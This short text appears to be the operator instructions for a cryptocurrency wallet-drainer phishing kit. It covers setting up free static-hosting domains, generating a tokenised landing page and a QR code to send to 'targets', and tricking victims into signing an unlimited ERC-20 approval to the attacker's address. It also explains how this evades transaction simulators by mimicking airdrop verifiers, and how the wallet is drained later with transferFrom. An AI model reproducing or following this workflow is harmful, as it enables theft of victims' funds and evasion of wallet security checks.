Workflow

1. Buy/claim a fresh free static-hosting domain (Netlify, Vercel, GitHub Pages, Cloudflare Pages — anything serving static files over HTTPS). 2. Enter it below with the drain parameters. 3. The panel mints a signed token and a ready-to-upload index.html. 4. Upload it to the exact path shown. 5. Scan-test the QR yourself before shipping it to a target. The QR encodes only https://your-domain/p/<token> — every wallet sees a normal https link, and the wallet handoff happens through the vendor's own deeplink domains.

Persistence note: approve-mode executes the standard ERC-20 approve(spender, 2^256-1) inside the victim's own wallet dApp browser, with your receiving EOA as spender. No drainer contract is deployed, so transaction simulators see a plain ERC-20 approval to an unbudgeted EOA — the same UI pattern as legitimate airdrop verifiers. Drain later with plain transferFrom at zero gas cost to you.
